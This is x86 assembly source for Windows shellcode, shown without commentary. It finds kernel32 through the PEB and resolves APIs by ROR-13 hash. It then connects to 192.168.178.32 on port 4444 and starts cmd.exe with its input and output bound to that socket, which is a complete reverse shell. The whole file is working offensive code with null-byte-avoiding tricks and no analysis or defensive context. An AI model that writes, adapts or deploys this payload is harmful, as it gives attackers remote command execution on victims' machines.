jmp init

get_api:; 81 bytes
	push ebp                          ; backup ebp (prologue)
	mov ebx, dword ptr [esp+0x08]     ; ebx = args[1]
	mov ecx, dword ptr [ebx+0x3C]     ; _IMAGE_DOS_HEADER->_IMAGE_NT_HEADERS
	mov edx, dword ptr [ebx+ecx+0x78] ; VirtualAddress
	add edx, ebx                      ; RVA->VA
	mov ebp, edx                      ; store _IMAGE_EXPORT_DIRECTORY
	mov ecx, dword ptr [edx+0x18]     ; NumberOfNames
	mov edx, dword ptr [edx+0x20]     ; AddressOfNames
	add edx, ebx                      ; RVA->VA
get_api.next:
	jecxz get_api.fail                ; terminate if ecx = 0
	xor edi, edi                      ; prepare for hashing
	xor eax, eax                      ; ...
	dec ecx                           ; decrement counter..
	mov esi, dword ptr [edx+ecx*4]    ; store the function's identifier
	add esi, ebx                      ; RVA->VA
get_api.incr:
	lodsb                             ; al = *(esi++)
	test al, al                       ; end of string reached?
	je get_api.vrfy                   ; jmp if this is the case
	ror edi, 0xD                      ; ror 13
	add edi, eax                      ; add char value to
	jmp get_api.incr                  ; repeat steps...
get_api.vrfy:
	cmp edi, dword ptr [esp+0x0C]     ; <rot13 hash>
	jne get_api.next                  ; repeat until this is the case
	mov edx, ebp                      ; recover _IMAGE_EXPORT_DIRECTORY
	mov eax, dword ptr [edx+0x24]     ; AddressOfNameOrdinals
	add eax, ebx                      ; RVA->VA
	mov cx, word ptr [eax+ecx*2]      ; store ordinal for AddressOfFunctions
	mov eax, dword ptr [edx+0x1C]     ; AddressOfFunctions
	add eax, ebx                      ; RVA->VA
	mov eax, dword ptr [eax+ecx*4]    ; store RVA of function's VA
	add eax, ebx                      ; RVA->VA
	jmp get_api.done
get_api.fail:
	xor eax, eax                      ; indicate failure (eax = 0)
get_api.done:
	pop ebp                           ; recover ebp (epilogue)
	ret

init:; 41 bytes
	mov ebp, esp
	sub esp, 0x40
	xor ecx, ecx
	mov edx, dword ptr fs:[ecx+0x30] ; _TEB_->_PEB
	mov ebx, dword ptr [edx+0x08]    ; _PEB->ImageBaseAddress
	mov dword ptr [ebp-0x04], ebx    ; store ImageBaseAddress locally
	mov edx, dword ptr [edx+0x0C]    ; _PEB->_PEB_LDR_DATA
	mov edx, dword ptr [edx+0x1C]    ; _PEB_LDR_DATA->_LIST_ENTRY (first)
init.next:
	mov eax, dword ptr [edx+0x08]    ; DllBase
	mov ebx, dword ptr [edx+0x20]    ; BaseDllName->Buffer
	mov edx, dword ptr [edx]         ; _PEB_LDR_DATA->_LIST_ENTRY (next)
	cmp word ptr [ebx+(12*2)], cx    ; check if ((wchar*)Buffer)[12] == 0x0
	jne init.next                    ; repeat until this is the case...
	mov dword ptr [ebp-0x08], eax    ; store DllBase locally

main:; 262 bytes

	; * STACK LAYOUT
	; * -0x04 | <base>
	; * -0x08 | kernel32
	; * -0x0C | ws32_2
	; * -0x10 | kernel32!LoadLibraryA
	; * -0x14 | kernel32!CreateProcessA
	; * -0x18 | kernel32!TerminateProcess
	; * -0x1C | ws2_32!WSAStartup
	; * -0x20 | ws2_32!socket
	; * -0x24 | ws2_32!connect
	; * -0x30 | <socket>
	; * -0x40 | ... (esp)
	
	; get_api(kernel32, "LoadLibraryA")
	push 0xec0e4e8e
	push dword ptr [ebp-0x08]
	call get_api
	mov dword ptr [ebp-0x10], eax
	
	; LoadLibraryA("ws2_32")
	push 0xffffcdcd
	push 0x5f327377
	neg dword ptr [esp+0x04]
	push esp
	call dword ptr [ebp-0x10]
	mov dword ptr [ebp-0x0C], eax
	
	; get_api(kernel32, "CreateProcessA")
	push 0x16b3fe72
	push dword ptr [ebp-0x08]
	call get_api
	mov dword ptr [ebp-0x14], eax
	
	; get_api(kernel32, "TerminateProcess")
	push 0x78b5b983
	push dword ptr [ebp-0x08]
	call get_api
	mov dword ptr [ebp-0x18], eax
	
	; get_api(ws2_32, "WSAStartup")
	push 0x3bfcedcb
	push dword ptr [ebp-0x0C]
	call get_api
	mov dword ptr [ebp-0x1C], eax
	
	; get_api(ws2_32, "WSASocketA")
	push 0xadf509d9
	push dword ptr [ebp-0x0C]
	call get_api
	mov dword ptr [ebp-0x20], eax
	
	; get_api(ws2_32, "connect")
	push 0x60aaf9ec
	push dword ptr [ebp-0x0C]
	call get_api
	mov dword ptr [ebp-0x24], eax

	; ? WSAStartup(MAKEWORD(2,2), ...)
	xor eax, eax
	mov ax, 0x0202
	sub sp, 0x1A4  ; ! must be 0x1A4
	push esp
	push eax
	call dword ptr [ebp-0x1C]
	
	; ? WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, ...)
	xor eax, eax
	push eax
	push eax
	push eax
	push 0x06
	push 0x01
	push 0x02
	call dword ptr [ebp-0x20]
	mov dword ptr [ebp-0x30], eax
	
	; ? connect(<socket>, {AF_INET, 4444, {192,168,178,32}, ...})
	xor eax, eax
	sub esp, 0x10
	mov word ptr [esp], 0xfffe
	neg word ptr [esp]
	mov word ptr [esp+0x02], 0x5c11
	mov dword ptr [esp+0x04], 0x20b2a8c0
	mov dword ptr [esp+0x08], eax
	mov dword ptr [esp+0x0C], eax
	mov edx, esp
	
	push 0x10
	push edx
	push dword ptr [ebp-0x30]
	call dword ptr [ebp-0x24]


	; "cmd.exe"
	push 0xff9a879b
	push 0x2e646d63
	neg dword ptr [esp+0x04]
	mov esi, esp

	; startupinfoa (unspecified is <null>)
	xor eax, eax
	xor ecx, ecx
	mov cl, 0x0a
	push dword ptr [ebp-0x30] ; hStdError
	push dword ptr [ebp-0x30] ; hStdOutput
	push dword ptr [ebp-0x30] ; hStdInput
	push eax
	push eax
	push 0x1
	shl dword ptr [esp], 0x08 ; dwFlags
startupinfo_loop:
	push eax
	loop startupinfo_loop
	push 0x44                 ; cb
	mov edi, esp

	; ? CreateProcess(lpCommandLine="cmd.exe", bInheritHandles=true, &si)
	inc ecx
	sub esp, 0x10
	push esp
	push edi
	push eax
	push eax
	push eax
	push ecx
	push eax
	push eax
	push esi
	push eax
	call dword ptr [ebp-0x14]

	; ? TerminateProcess(-1, 0)
	xor eax, eax
	push eax
	push 0xffffffff
	call dword ptr [ebp-0x18]